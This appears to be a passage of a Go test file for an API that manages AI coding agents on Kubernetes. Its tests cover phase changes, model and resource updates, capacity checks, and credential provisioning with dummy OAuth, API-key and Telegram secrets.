func TestAgents_Stop(t *testing.T) {
	h, _ := buildAgentHandler(t, sampleAgentCRD("dave"))
	req := authedRequest(t, http.MethodPost, "/api/v1/agents/dave/stop", nil)
	rr := httptest.NewRecorder()
	h.ServeHTTP(rr, req)
	if rr.Code != http.StatusOK {
		t.Errorf("want 200, got %d: %s", rr.Code, rr.Body.String())
	}
}

// TestAgents_Restart verifies POST /api/v1/agents/{name}/restart sets desiredPhase.
func TestAgents_Restart(t *testing.T) {
	h, _ := buildAgentHandler(t, sampleAgentCRD("dave"))
	req := authedRequest(t, http.MethodPost, "/api/v1/agents/dave/restart", nil)
	rr := httptest.NewRecorder()
	h.ServeHTTP(rr, req)
	if rr.Code != http.StatusOK {
		t.Errorf("want 200, got %d: %s", rr.Code, rr.Body.String())
	}
}

// TestAgents_ForceNeedsAuth verifies the operator-forced re-auth action (#395):
// POST /force-needs-auth sets spec.desiredPhase=NeedsAuth via the shared
// setAgentDesiredPhase path. Which phases actually honor it,
// and the pod-delete, are enforced by the controller's classifyEvent gate; the
// API layer's job is just to patch the desired phase, asserted here.
func TestAgents_ForceNeedsAuth(t *testing.T) {
	h, fc := buildAgentHandler(t, sampleAgentCRD("dave"))
	req := authedRequest(t, http.MethodPost, "/api/v1/agents/dave/force-needs-auth", nil)
	rr := httptest.NewRecorder()
	h.ServeHTTP(rr, req)
	if rr.Code != http.StatusOK {
		t.Fatalf("want 200, got %d: %s", rr.Code, rr.Body.String())
	}
	got := &kyberv1.Agent{}
	if err := fc.Get(context.Background(), types.NamespacedName{Name: "dave", Namespace: "kyber-system"}, got); err != nil {
		t.Fatalf("refetch: %v", err)
	}
	if got.Spec.DesiredPhase != kyberv1.AgentPhaseNeedsAuth {
		t.Errorf("DesiredPhase = %q, want NeedsAuth", got.Spec.DesiredPhase)
	}
}

// TestAgents_SetModel_Running verifies that changing the model on a Running agent
// updates spec.Model and sets DesiredPhase=Restarting so the pod rolls immediately.
func TestAgents_SetModel_Running(t *testing.T) {
	agent := sampleAgentCRD("dave")
	agent.Status.Phase = kyberv1.AgentPhaseRunning
	h, fc := buildAgentHandler(t, agent)

	req := authedRequest(t, http.MethodPost, "/api/v1/agents/dave/set-model", map[string]interface{}{
		"model": "claude-opus-4",
	})
	rr := httptest.NewRecorder()
	h.ServeHTTP(rr, req)
	if rr.Code != http.StatusOK {
		t.Fatalf("want 200, got %d: %s", rr.Code, rr.Body.String())
	}
	var resp api.AgentResponse
	if err := json.NewDecoder(rr.Body).Decode(&resp); err != nil {
		t.Fatalf("decoding: %v", err)
	}
	if resp.Model != "claude-opus-4" {
		t.Errorf("Model: got %q, want %q", resp.Model, "claude-opus-4")
	}
	got := &kyberv1.Agent{}
	if err := fc.Get(context.Background(), types.NamespacedName{Name: "dave", Namespace: "kyber-system"}, got); err != nil {
		t.Fatalf("refetch: %v", err)
	}
	if got.Spec.DesiredPhase != kyberv1.AgentPhaseRestarting {
		t.Errorf("DesiredPhase = %q, want Restarting", got.Spec.DesiredPhase)
	}
}

// TestAgents_SetModel_Failed_UsesDesiredRunning verifies the ResetRetry path:
// a Failed agent gets DesiredPhase=Running, not Restarting.
func TestAgents_SetModel_Failed_UsesDesiredRunning(t *testing.T) {
	agent := sampleAgentCRD("dave")
	agent.Status.Phase = kyberv1.AgentPhaseFailed
	h, fc := buildAgentHandler(t, agent)

	req := authedRequest(t, http.MethodPost, "/api/v1/agents/dave/set-model", map[string]interface{}{
		"model": "claude-opus-4",
	})
	rr := httptest.NewRecorder()
	h.ServeHTTP(rr, req)
	if rr.Code != http.StatusOK {
		t.Fatalf("want 200, got %d: %s", rr.Code, rr.Body.String())
	}
	got := &kyberv1.Agent{}
	if err := fc.Get(context.Background(), types.NamespacedName{Name: "dave", Namespace: "kyber-system"}, got); err != nil {
		t.Fatalf("refetch: %v", err)
	}
	if got.Spec.DesiredPhase != kyberv1.AgentPhaseRunning {
		t.Errorf("DesiredPhase = %q, want Running (ResetRetry path)", got.Spec.DesiredPhase)
	}
}

// TestAgents_SetModel_Stopped_DoesNotRestart verifies that changing the model on
// a Stopped agent does not set DesiredPhase — the model is persisted but the
// agent is not woken up.
func TestAgents_SetModel_Stopped_DoesNotRestart(t *testing.T) {
	agent := sampleAgentCRD("dave")
	agent.Status.Phase = kyberv1.AgentPhaseStopped
	h, fc := buildAgentHandler(t, agent)

	req := authedRequest(t, http.MethodPost, "/api/v1/agents/dave/set-model", map[string]interface{}{
		"model": "claude-opus-4",
	})
	rr := httptest.NewRecorder()
	h.ServeHTTP(rr, req)
	if rr.Code != http.StatusOK {
		t.Fatalf("want 200, got %d: %s", rr.Code, rr.Body.String())
	}
	got := &kyberv1.Agent{}
	if err := fc.Get(context.Background(), types.NamespacedName{Name: "dave", Namespace: "kyber-system"}, got); err != nil {
		t.Fatalf("refetch: %v", err)
	}
	if got.Spec.DesiredPhase != "" {
		t.Errorf("DesiredPhase = %q, want empty (Stopped agent must not be woken)", got.Spec.DesiredPhase)
	}
	if got.Spec.Model != "claude-opus-4" {
		t.Errorf("Model = %q, want %q", got.Spec.Model, "claude-opus-4")
	}
}

// TestCreateAgent_CapacityOverflow_Rejected verifies 409 when requested
// resources exceed the Machine's declared Spec.Capacity.
func TestCreateAgent_CapacityOverflow_Rejected(t *testing.T) {
	// Fabricate a Machine with a small capacity directly via the fake client.
	smallMachine := &kyberv1.Machine{
		ObjectMeta: metav1.ObjectMeta{Name: "local", Namespace: "kyber-system"},
		Spec: kyberv1.MachineSpec{
			Provider: kyberv1.MachineProviderMock,
			Capacity: kyberv1.MachineCapacity{
				CPU:    resource.MustParse("2"),
				Memory: resource.MustParse("4Gi"),
			},
		},
	}
	h, _ := buildAgentHandler(t, smallMachine)

	// Requested cpu (4) exceeds the machine's 2.
	req := authedRequest(t, http.MethodPost, "/api/v1/agents", map[string]interface{}{
		"name":    "big",
		"machine": "local",
		"runtime": "claude-code",
		"model":   "claude-sonnet-4",
		"resources": map[string]interface{}{
			"cpu":    "4",
			"memory": "8Gi",
		},
		"secrets": map[string]interface{}{
			"authType":   "oauth",
			"oauthToken": "dummy",
		},
	})
	rr := httptest.NewRecorder()
	h.ServeHTTP(rr, req)

	if rr.Code != http.StatusConflict {
		t.Fatalf("status = %d, want 409; body=%s", rr.Code, rr.Body.String())
	}
	if !strings.Contains(rr.Body.String(), "insufficient capacity") {
		t.Errorf("body should mention 'insufficient capacity'; got %s", rr.Body.String())
	}
}

// TestAgents_Logs_NoPod verifies GET /api/v1/agents/{name}/logs returns 503
// when the agent exists but Clientset is nil (C2 — replaced the C1 501 stub).
// The handler derives the pod name from the agent name deterministically, so
// Status.PodName being empty no longer causes a 404 at this stage.
func TestAgents_Logs_NoPod(t *testing.T) {
	h, _ := buildAgentHandler(t, sampleAgentCRD("dave"))
	req := authedRequest(t, http.MethodGet, "/api/v1/agents/dave/logs", nil)
	rr := httptest.NewRecorder()
	h.ServeHTTP(rr, req)
	// Clientset is nil on buildAgentHandler → 503 service unavailable.
	if rr.Code != http.StatusServiceUnavailable {
		t.Errorf("want 503 (nil clientset), got %d: %s", rr.Code, rr.Body.String())
	}
}

// TestAgents_Exec_NoPod verifies GET /api/v1/agents/{name}/exec returns 503
// when the agent exists but RestConfig/Clientset is nil (C2 — replaced the C1 501 stub).
// The handler derives the pod name from the agent name deterministically, so
// Status.PodName being empty no longer causes a 404 at this stage.
func TestAgents_Exec_NoPod(t *testing.T) {
	h, _ := buildAgentHandler(t, sampleAgentCRD("dave"))
	req := authedRequest(t, http.MethodGet, "/api/v1/agents/dave/exec", nil)
	rr := httptest.NewRecorder()
	h.ServeHTTP(rr, req)
	// RestConfig and Clientset are nil on buildAgentHandler → 503 service unavailable.
	if rr.Code != http.StatusServiceUnavailable {
		t.Errorf("want 503 (nil restConfig), got %d: %s", rr.Code, rr.Body.String())
	}
}

// TestAgents_Auth verifies 401 without API key.
func TestAgents_Auth(t *testing.T) {
	h, _ := buildAgentHandler(t)
	req := httptest.NewRequest(http.MethodGet, "/api/v1/agents", nil)
	rr := httptest.NewRecorder()
	h.ServeHTTP(rr, req)
	if rr.Code != http.StatusUnauthorized {
		t.Errorf("want 401, got %d", rr.Code)
	}
}

// TestCreateAgent_OAuthCodeExchange verifies that providing oauthCode+pkceVerifier
// triggers a real PKCE exchange and writes a multi-key <name>-oauth secret.
func TestCreateAgent_CodexAuthJSON(t *testing.T) {
	s := newTestPublicServer(t, "test-key")
	s.ValidRuntimes = map[string]bool{"codex": true}
	scheme := mustNewScheme(t)
	s.K8sClient = fake.NewClientBuilder().WithScheme(scheme).
		WithRuntimeObjects(defaultMachine()).Build()

	authJSON := `{"tokens":{"access_token":"secret-value"}}`
	body := fmt.Sprintf(`{
		"name":"codex-agent","machine":"worker-1","runtime":"codex","model":"gpt-5.6-sol",
		"resources":{"cpu":"1","memory":"2Gi","disk":"50Gi"},
		"secrets":{"authType":"oauth","codexAuthJson":%q,"telegramEnabled":true,
			"telegramBotToken":"123:test","telegramAllowedUserIds":["1000000001"]}
	}`, authJSON)
	req := httptest.NewRequest(http.MethodPost, "/api/v1/agents", strings.NewReader(body))
	req.Header.Set("Authorization", "Bearer test-key")
	req.Header.Set("Content-Type", "application/json")
	rr := httptest.NewRecorder()
	buildTestHandler(s).ServeHTTP(rr, req)
	if rr.Code != http.StatusCreated {
		t.Fatalf("status=%d body=%s", rr.Code, rr.Body.String())
	}
	sec := &corev1.Secret{}
	if err := s.K8sClient.Get(context.Background(), types.NamespacedName{
		Name: "codex-agent-codex-auth", Namespace: s.Namespace,
	}, sec); err != nil {
		t.Fatal(err)
	}
	if got := string(sec.Data["auth.json"]); got != authJSON {
		t.Fatalf("auth.json=%q, want exact submitted document", got)
	}
	if strings.Contains(rr.Body.String(), "secret-value") {
		t.Fatal("create response leaked Codex credentials")
	}
	telegram := &corev1.Secret{}
	if err := s.K8sClient.Get(context.Background(), types.NamespacedName{
		Name: "codex-agent-telegram", Namespace: s.Namespace,
	}, telegram); err != nil {
		t.Fatal(err)
	}
	if string(telegram.Data["allowed-user-ids"]) != "1000000001" || len(telegram.Data["webhook-secret"]) == 0 {
		t.Fatalf("Telegram sidecar secret not fully provisioned: keys=%v", telegram.Data)
	}
	agentObj := &kyberv1.Agent{}
	if err := s.K8sClient.Get(context.Background(), types.NamespacedName{Name: "codex-agent", Namespace: s.Namespace}, agentObj); err != nil {
		t.Fatal(err)
	}
	if len(agentObj.Spec.InboundBindings) != 1 || agentObj.Spec.InboundBindings[0].Name != "telegram" {
		t.Fatalf("Codex Telegram inbound binding not provisioned: %+v", agentObj.Spec.InboundBindings)
	}
}

func TestCreateAgent_CodexDeviceAuthCreatesPlaceholder(t *testing.T) {
	s := newTestPublicServer(t, "test-key")
	s.ValidRuntimes = map[string]bool{"codex": true}
	s.K8sClient = fake.NewClientBuilder().WithScheme(mustNewScheme(t)).
		WithRuntimeObjects(defaultMachine()).Build()
	body := `{
		"name":"device-agent","machine":"worker-1","runtime":"codex","model":"gpt-5.6-sol",
		"resources":{"cpu":"1","memory":"2Gi","disk":"50Gi"},
		"secrets":{"authType":"oauth"}
	}`
	req := httptest.NewRequest(http.MethodPost, "/api/v1/agents", strings.NewReader(body))
	req.Header.Set("Authorization", "Bearer test-key")
	req.Header.Set("Content-Type", "application/json")
	rr := httptest.NewRecorder()
	buildTestHandler(s).ServeHTTP(rr, req)
	if rr.Code != http.StatusCreated {
		t.Fatalf("status=%d body=%s", rr.Code, rr.Body.String())
	}
	sec := &corev1.Secret{}
	if err := s.K8sClient.Get(context.Background(), types.NamespacedName{
		Name: "device-agent-codex-auth", Namespace: s.Namespace,
	}, sec); err != nil {
		t.Fatal(err)
	}
	if got := string(sec.Data["auth.json"]); got != "{}" {
		t.Fatalf("auth.json=%q, want device-auth placeholder {}", got)
	}
}

func TestCreateAgent_CodexAPIKey(t *testing.T) {
	s := newTestPublicServer(t, "test-key")
	s.ValidRuntimes = map[string]bool{"codex": true}
	s.K8sClient = fake.NewClientBuilder().WithScheme(mustNewScheme(t)).
		WithRuntimeObjects(defaultMachine()).Build()
	body := `{
		"name":"key-agent","machine":"worker-1","runtime":"codex","model":"gpt-5.6-sol",
		"resources":{"cpu":"1","memory":"2Gi","disk":"50Gi"},
		"secrets":{"authType":"api-key","openaiApiKey":"sk-test"}
	}`
	req := httptest.NewRequest(http.MethodPost, "/api/v1/agents", strings.NewReader(body))
	req.Header.Set("Authorization", "Bearer test-key")
	req.Header.Set("Content-Type", "application/json")
	rr := httptest.NewRecorder()
	buildTestHandler(s).ServeHTTP(rr, req)
	if rr.Code != http.StatusCreated {
		t.Fatalf("status=%d body=%s", rr.Code, rr.Body.String())
	}
	sec := &corev1.Secret{}
	if err := s.K8sClient.Get(context.Background(), types.NamespacedName{
		Name: "key-agent-openai", Namespace: s.Namespace,
	}, sec); err != nil {
		t.Fatal(err)
	}
	got := string(sec.Data["token"])
	if got == "" {
		got = sec.StringData["token"] // controller-runtime fake does not convert StringData.
	}
	if got != "sk-test" {
		t.Fatalf("OpenAI token=%q, want sk-test", got)
	}
}

func TestCreateAgent_CodexRejectsInvalidAuthJSON(t *testing.T) {
	s := newTestPublicServer(t, "test-key")
	s.ValidRuntimes = map[string]bool{"codex": true}
	scheme := mustNewScheme(t)
	s.K8sClient = fake.NewClientBuilder().WithScheme(scheme).
		WithRuntimeObjects(defaultMachine()).Build()
	body := `{
		"name":"codex-agent","machine":"worker-1","runtime":"codex","model":"gpt-5.6-sol",
		"resources":{"cpu":"1","memory":"2Gi","disk":"50Gi"},
		"secrets":{"authType":"oauth","codexAuthJson":"not-json"}
	}`
	req := httptest.NewRequest(http.MethodPost, "/api/v1/agents", strings.NewReader(body))
	req.Header.Set("Authorization", "Bearer test-key")
	req.Header.Set("Content-Type", "application/json")
	rr := httptest.NewRecorder()
	buildTestHandler(s).ServeHTTP(rr, req)
	if rr.Code != http.StatusBadRequest {
		t.Fatalf("status=%d body=%s", rr.Code, rr.Body.String())
	}
	if !strings.Contains(rr.Body.String(), "secrets.codexAuthJson") {
		t.Fatalf("response does not identify Codex auth field: %s", rr.Body.String())
	}
}

func TestCreateAgent_OAuthCodeExchange(t *testing.T) {
	mock := mockserver.New()
	ts := httptest.NewServer(mock)
	defer ts.Close()

	// Generate PKCE pair.
	verifier := "route-test-verifier-with-sufficient-entropy-01"
	sum := sha256.Sum256([]byte(verifier))
	challenge := base64.RawURLEncoding.EncodeToString(sum[:])
	code := mock.IssueCode(challenge)

	s := newTestPublicServer(t, "test-key")
	s.AnthropicTokenURL = ts.URL + "/v1/oauth/token"
	s.ValidRuntimes = map[string]bool{"claude-code": true}

	// Pre-seed a Machine so the machine-existence check passes.
	scheme := mustNewScheme(t)
	fakeClient := fake.NewClientBuilder().
		WithScheme(scheme).
		WithRuntimeObjects(defaultMachine()).
		Build()
	s.K8sClient = fakeClient

	body := fmt.Sprintf(`{
		"name":"alice","machine":"worker-1","runtime":"claude-code","model":"sonnet",
		"resources":{"cpu":"1","memory":"2Gi","disk":"50Gi"},
		"secrets":{"authType":"oauth","oauthCode":%q,"pkceVerifier":%q,"pkceState":"test-state",
			"telegramEnabled":true,"telegramBotToken":"123:test","telegramAllowedUserIds":["1000000001"]}
	}`, code, verifier)

	rr := httptest.NewRecorder()
	req := httptest.NewRequest("POST", "/api/v1/agents", strings.NewReader(body))
	req.Header.Set("Authorization", "Bearer test-key")
	req.Header.Set("Content-Type", "application/json")
	h := buildTestHandler(s)
	h.ServeHTTP(rr, req)

	if rr.Code != http.StatusCreated {
		t.Fatalf("status=%d body=%s", rr.Code, rr.Body.String())
	}
	sec := &corev1.Secret{}
	if err := s.K8sClient.Get(context.Background(),
		types.NamespacedName{Name: "alice-oauth", Namespace: s.Namespace}, sec); err != nil {
		t.Fatal(err)
	}
	if len(sec.Data["access_token"]) == 0 || len(sec.Data["refresh_token"]) == 0 {
		t.Fatalf("missing tokens in secret data: %v", sec.Data)
	}
	// expires_at must be present and within a reasonable range.
	expiresAtRaw, ok := sec.Data["expires_at"]
	if !ok || len(expiresAtRaw) == 0 {
		t.Fatalf("missing expires_at in secret data: %v", sec.Data)
	}
	expiresAtMs, err := strconv.ParseInt(string(expiresAtRaw), 10, 64)
	if err != nil {
		t.Fatalf("expires_at not a valid int64: %s", expiresAtRaw)
	}
	nowMs := time.Now().UnixMilli()
	if expiresAtMs <= nowMs {
		t.Fatalf("expires_at %d is not in the future (now=%d)", expiresAtMs, nowMs)
	}
	if expiresAtMs > nowMs+int64(24*time.Hour.Milliseconds()) {
		t.Fatalf("expires_at %d is more than 24h in the future (now=%d)", expiresAtMs, nowMs)
	}

	telegram := &corev1.Secret{}
	if err := s.K8sClient.Get(context.Background(),
		types.NamespacedName{Name: "alice-telegram", Namespace: s.Namespace}, telegram); err != nil {
		t.Fatal(err)
	}
	if got := string(telegram.Data["allowed-user-ids"]); got != "1000000001" {
		t.Errorf("allowed-user-ids = %q, want %q", got, "1000000001")
	}
	if len(telegram.Data["webhook-secret"]) == 0 {
		t.Error("Telegram Secret has no webhook-secret")
	}
	agentObj := &kyberv1.Agent{}
	if err := s.K8sClient.Get(context.Background(),
		types.NamespacedName{Name: "alice", Namespace: s.Namespace}, agentObj); err != nil {
		t.Fatal(err)
	}
	if len(agentObj.Spec.InboundBindings) != 1 || agentObj.Spec.InboundBindings[0].Name != "telegram" {
		t.Fatalf("Claude Code Telegram inbound binding not provisioned: %+v", agentObj.Spec.InboundBindings)
	}
}

// TestCreateAgent_RejectsOAuthCodeWithoutVerifier verifies that providing oauthCode
// without pkceVerifier is rejected with a 400 error.
func TestCreateAgent_RejectsOAuthCodeWithoutVerifier(t *testing.T) {
	s := newTestPublicServer(t, "test-key")
	s.ValidRuntimes = map[string]bool{"claude-code": true}

	// Pre-seed a Machine so the machine-existence check passes.
	scheme := mustNewScheme(t)
	fakeClient := fake.NewClientBuilder().
		WithScheme(scheme).
		WithRuntimeObjects(defaultMachine()).
		Build()
	s.K8sClient = fakeClient

	body := `{
		"name":"bob","machine":"worker-1","runtime":"claude-code","model":"sonnet",
		"resources":{"cpu":"1","memory":"2Gi","disk":"50Gi"},
		"secrets":{"authType":"oauth","oauthCode":"c"}
	}`
	req := httptest.NewRequest("POST", "/api/v1/agents", strings.NewReader(body))
	req.Header.Set("Authorization", "Bearer test-key")
	req.Header.Set("Content-Type", "application/json")
	rr := httptest.NewRecorder()
	h := buildTestHandler(s)
	h.ServeHTTP(rr, req)
	if rr.Code != http.StatusBadRequest {
		t.Fatalf("expected 400, got %d: %s", rr.Code, rr.Body.String())
	}
}

// TestCreateAgent_RejectsOAuthCodeWithoutState verifies that providing oauthCode
// without pkceState is rejected with a 400 error.
func TestCreateAgent_RejectsOAuthCodeWithoutState(t *testing.T) {
	s := newTestPublicServer(t, "test-key")
	s.ValidRuntimes = map[string]bool{"claude-code": true}

	// Pre-seed a Machine so the machine-existence check passes.
	scheme := mustNewScheme(t)
	fakeClient := fake.NewClientBuilder().
		WithScheme(scheme).
		WithRuntimeObjects(defaultMachine()).
		Build()
	s.K8sClient = fakeClient

	body := `{
		"name":"bob","machine":"worker-1","runtime":"claude-code","model":"sonnet",
		"resources":{"cpu":"1","memory":"2Gi","disk":"50Gi"},
		"secrets":{"authType":"oauth","oauthCode":"c","pkceVerifier":"v"}
	}`
	req := httptest.NewRequest("POST", "/api/v1/agents", strings.NewReader(body))
	req.Header.Set("Authorization", "Bearer test-key")
	req.Header.Set("Content-Type", "application/json")
	rr := httptest.NewRecorder()
	h := buildTestHandler(s)
	h.ServeHTTP(rr, req)
	if rr.Code != http.StatusBadRequest {
		t.Fatalf("expected 400, got %d: %s", rr.Code, rr.Body.String())
	}
}

// TestCreateAgent_InsufficientResources verifies that the API rejects agent creation
// with 409 when the target machine doesn't have enough remaining capacity after
// accounting for existing agents.
func TestCreateAgent_InsufficientResources(t *testing.T) {
	scheme := mustNewScheme(t)

	// Machine with 2 CPU capacity.
	machine := &kyberv1.Machine{
		ObjectMeta: metav1.ObjectMeta{Name: "worker-1", Namespace: "kyber-system"},
		Spec: kyberv1.MachineSpec{
			Provider:    "gce",
			MachineType: "e2-standard-2",
			Zone:        "us-central1-a",
			Capacity: kyberv1.MachineCapacity{
				CPU:    resource.MustParse("2"),
				Memory: resource.MustParse("8Gi"),
			},
		},
		Status: kyberv1.MachineStatus{
			Phase:    kyberv1.MachinePhaseReady,
			NodeName: "test-node",
		},
	}

	// Existing agent consuming 1500m CPU — leaves only 500m free.
	existingAgent := &kyberv1.Agent{
		ObjectMeta: metav1.ObjectMeta{Name: "bob", Namespace: "kyber-system"},
		Spec: kyberv1.AgentSpec{
			Machine: "worker-1",
			Resources: kyberv1.AgentResources{
				CPU:    resource.MustParse("1500m"),
				Memory: resource.MustParse("2Gi"),
			},
		},
	}

	fakeClient := fake.NewClientBuilder().
		WithScheme(scheme).
		WithRuntimeObjects(machine, existingAgent).
		Build()

	s := &api.Server{
		K8sClient:     fakeClient,
		APIKey:        "test-key",
		Namespace:     "kyber-system",
		ValidRuntimes: map[string]bool{"claude-code": true},
	}

	// Request 1 CPU — exceeds the 500m remaining after bob's 1500m.
	body := `{
		"name":"r2d2","machine":"worker-1","runtime":"claude-code","model":"sonnet",
		"resources":{"cpu":"1","memory":"2Gi","disk":"10Gi"},
		"secrets":{"authType":"api-key","anthropicApiKey":"sk-test"}
	}`
	req := httptest.NewRequest("POST", "/api/v1/agents", strings.NewReader(body))
	req.Header.Set("Authorization", "Bearer test-key")
	req.Header.Set("Content-Type", "application/json")
	rr := httptest.NewRecorder()
	s.BuildHandler().ServeHTTP(rr, req)

	if rr.Code != http.StatusConflict {
		t.Fatalf("expected 409, got %d: %s", rr.Code, rr.Body.String())
	}
	if !strings.Contains(rr.Body.String(), "insufficient capacity") {
		t.Errorf("expected 'insufficient capacity' in error body, got: %s", rr.Body.String())
	}
}

// TestAgents_SetResources_HappyPath verifies the handler patches resources
// and sets DesiredPhase=Restarting so the controller rolls the pod with the
// new limits.
func TestAgents_SetResources_HappyPath(t *testing.T) {
	agent := sampleAgentCRD("dave")
	agent.Status.Phase = kyberv1.AgentPhaseRunning
	h, fc := buildAgentHandler(t, agent)

	req := authedRequest(t, http.MethodPost, "/api/v1/agents/dave/set-resources", map[string]interface{}{
		"cpu":    "500m",
		"memory": "4Gi",
	})
	rr := httptest.NewRecorder()
	h.ServeHTTP(rr, req)

	if rr.Code != http.StatusOK {
		t.Fatalf("status = %d, want 200: %s", rr.Code, rr.Body.String())
	}

	var resp api.AgentResponse
	if err := json.NewDecoder(rr.Body).Decode(&resp); err != nil {
		t.Fatalf("decoding: %v", err)
	}
	if resp.Resources.CPU != "500m" {
		t.Errorf("Resources.CPU = %q, want %q", resp.Resources.CPU, "500m")
	}
	if resp.Resources.Memory != "4Gi" {
		t.Errorf("Resources.Memory = %q, want %q", resp.Resources.Memory, "4Gi")
	}

	got := &kyberv1.Agent{}
	if err := fc.Get(context.Background(), types.NamespacedName{Name: "dave", Namespace: "kyber-system"}, got); err != nil {
		t.Fatalf("refetch: %v", err)
	}
	if got.Spec.DesiredPhase != kyberv1.AgentPhaseRestarting {
		t.Errorf("DesiredPhase = %q, want Restarting", got.Spec.DesiredPhase)
	}
}

func TestAgents_SetResources_CPUOnly_LeavesMemoryUntouched(t *testing.T) {
	agent := sampleAgentCRD("dave")
	h, fc := buildAgentHandler(t, agent)
	req := authedRequest(t, http.MethodPost, "/api/v1/agents/dave/set-resources", map[string]interface{}{
		"cpu": "500m",
	})
	rr := httptest.NewRecorder()
	h.ServeHTTP(rr, req)
	if rr.Code != http.StatusOK {
		t.Fatalf("status = %d, want 200: %s", rr.Code, rr.Body.String())
	}
	got := &kyberv1.Agent{}
	if err := fc.Get(context.Background(), types.NamespacedName{Name: "dave", Namespace: "kyber-system"}, got); err != nil {
		t.Fatalf("refetch: %v", err)
	}
	if got.Spec.Resources.CPU.String() != "500m" {
		t.Errorf("CPU = %s, want 500m", got.Spec.Resources.CPU.String())
	}
	if got.Spec.Resources.Memory.String() != "2Gi" {
		t.Errorf("Memory = %s, want 2Gi (untouched)", got.Spec.Resources.Memory.String())
	}
}

func TestAgents_SetResources_MemoryOnly_LeavesCPUUntouched(t *testing.T) {
	agent := sampleAgentCRD("dave")
	h, fc := buildAgentHandler(t, agent)
	req := authedRequest(t, http.MethodPost, "/api/v1/agents/dave/set-resources", map[string]interface{}{
		"memory": "4Gi",
	})
	rr := httptest.NewRecorder()
	h.ServeHTTP(rr, req)
	if rr.Code != http.StatusOK {
		t.Fatalf("status = %d, want 200: %s", rr.Code, rr.Body.String())
	}
	got := &kyberv1.Agent{}
	if err := fc.Get(context.Background(), types.NamespacedName{Name: "dave", Namespace: "kyber-system"}, got); err != nil {
		t.Fatalf("refetch: %v", err)
	}
	if got.Spec.Resources.CPU.String() != "1" {
		t.Errorf("CPU = %s, want 1 (untouched)", got.Spec.Resources.CPU.String())
	}
	if got.Spec.Resources.Memory.String() != "4Gi" {
		t.Errorf("Memory = %s, want 4Gi", got.Spec.Resources.Memory.String())
	}
}

func TestAgents_SetResources_BadQuantity_Returns400(t *testing.T) {
	agent := sampleAgentCRD("dave")
	h, _ := buildAgentHandler(t, agent)
	req := authedRequest(t, http.MethodPost, "/api/v1/agents/dave/set-resources", map[string]interface{}{
		"memory": "two gigs",
	})
	rr := httptest.NewRecorder()
	h.ServeHTTP(rr, req)
	if rr.Code != http.StatusBadRequest {
		t.Fatalf("status = %d, want 400: %s", rr.Code, rr.Body.String())
	}
	if !strings.Contains(rr.Body.String(), "memory") {
		t.Errorf("body should mention 'memory'; got %s", rr.Body.String())
	}
}

func TestAgents_SetResources_CPUBelowMinimum_Returns400(t *testing.T) {
	agent := sampleAgentCRD("dave")
	h, _ := buildAgentHandler(t, agent)
	req := authedRequest(t, http.MethodPost, "/api/v1/agents/dave/set-resources", map[string]interface{}{
		"cpu": "50m",
	})
	rr := httptest.NewRecorder()
	h.ServeHTTP(rr, req)
	if rr.Code != http.StatusBadRequest {
		t.Fatalf("status = %d, want 400: %s", rr.Code, rr.Body.String())
	}
	if !strings.Contains(strings.ToLower(rr.Body.String()), "minimum") {
		t.Errorf("body should mention minimum; got %s", rr.Body.String())
	}
}

func TestAgents_SetResources_MemoryBelowMinimum_Returns400(t *testing.T) {
	agent := sampleAgentCRD("dave")
	h, _ := buildAgentHandler(t, agent)
	req := authedRequest(t, http.MethodPost, "/api/v1/agents/dave/set-resources", map[string]interface{}{
		"memory": "64Mi",
	})
	rr := httptest.NewRecorder()
	h.ServeHTTP(rr, req)
	if rr.Code != http.StatusBadRequest {
		t.Fatalf("status = %d, want 400: %s", rr.Code, rr.Body.String())
	}
}

// TestAgents_SetResources_Failed_UsesDesiredRunning verifies that when the
// agent is in Failed phase (e.g. after an OOM), the handler sets
// DesiredPhase=Running (which drives the ResetRetry path in the state
// machine), NOT Restarting (which isn't a defined Failed-state transition).
func TestAgents_SetResources_Failed_UsesDesiredRunning(t *testing.T) {
	agent := sampleAgentCRD("dave")
	agent.Status.Phase = kyberv1.AgentPhaseFailed
	agent.Status.RestartCount = 2
	h, fc := buildAgentHandler(t, agent)

	req := authedRequest(t, http.MethodPost, "/api/v1/agents/dave/set-resources", map[string]interface{}{
		"memory": "4Gi",
	})
	rr := httptest.NewRecorder()
	h.ServeHTTP(rr, req)
	if rr.Code != http.StatusOK {
		t.Fatalf("status = %d, want 200: %s", rr.Code, rr.Body.String())
	}

	got := &kyberv1.Agent{}
	if err := fc.Get(context.Background(), types.NamespacedName{Name: "dave", Namespace: "kyber-system"}, got); err != nil {
		t.Fatalf("refetch: %v", err)
	}
	if got.Spec.DesiredPhase != kyberv1.AgentPhaseRunning {
		t.Errorf("DesiredPhase = %q, want Running (ResetRetry path)", got.Spec.DesiredPhase)
	}
}

func TestAgents_SetResources_ExceedsMachineCapacity_Returns409(t *testing.T) {
	// Machine with 2 CPU / 4 Gi total.
	smallMachine := &kyberv1.Machine{
		ObjectMeta: metav1.ObjectMeta{Name: "local", Namespace: "kyber-system"},
		Spec: kyberv1.MachineSpec{
			Provider: kyberv1.MachineProviderMock,
			Capacity: kyberv1.MachineCapacity{
				CPU:    resource.MustParse("2"),
				Memory: resource.MustParse("4Gi"),
			},
		},
	}
	agent := sampleAgentCRD("dave")
	agent.Spec.Machine = "local"
	agent.Spec.Resources.CPU = resource.MustParse("1")
	agent.Spec.Resources.Memory = resource.MustParse("2Gi")

	h, _ := buildAgentHandler(t, smallMachine, agent)

	// Machine total = 2 CPU. Dave currently holds 1, returns it, gets 2 headroom.
	// Requesting 3 exceeds → 409.
	req := authedRequest(t, http.MethodPost, "/api/v1/agents/dave/set-resources", map[string]interface{}{
		"cpu": "3",
	})
	rr := httptest.NewRecorder()
	h.ServeHTTP(rr, req)
	if rr.Code != http.StatusConflict {
		t.Fatalf("status = %d, want 409: %s", rr.Code, rr.Body.String())
	}
	if !strings.Contains(rr.Body.String(), "insufficient capacity") {
		t.Errorf("body should mention 'insufficient capacity'; got %s", rr.Body.String())
	}
}

// TestAgents_SetResources_SameCapacityOK verifies an in-place bump up to the
// machine ceiling is allowed (the agent's own current allocation must be
// treated as returnable headroom).
func TestAgents_SetResources_SameCapacityOK(t *testing.T) {
	smallMachine := &kyberv1.Machine{
		ObjectMeta: metav1.ObjectMeta{Name: "local", Namespace: "kyber-system"},
		Spec: kyberv1.MachineSpec{
			Provider: kyberv1.MachineProviderMock,
			Capacity: kyberv1.MachineCapacity{
				CPU:    resource.MustParse("2"),
				Memory: resource.MustParse("4Gi"),
			},
		},
	}
	agent := sampleAgentCRD("dave")
	agent.Spec.Machine = "local"
	agent.Spec.Resources.CPU = resource.MustParse("1")
	agent.Spec.Resources.Memory = resource.MustParse("2Gi")

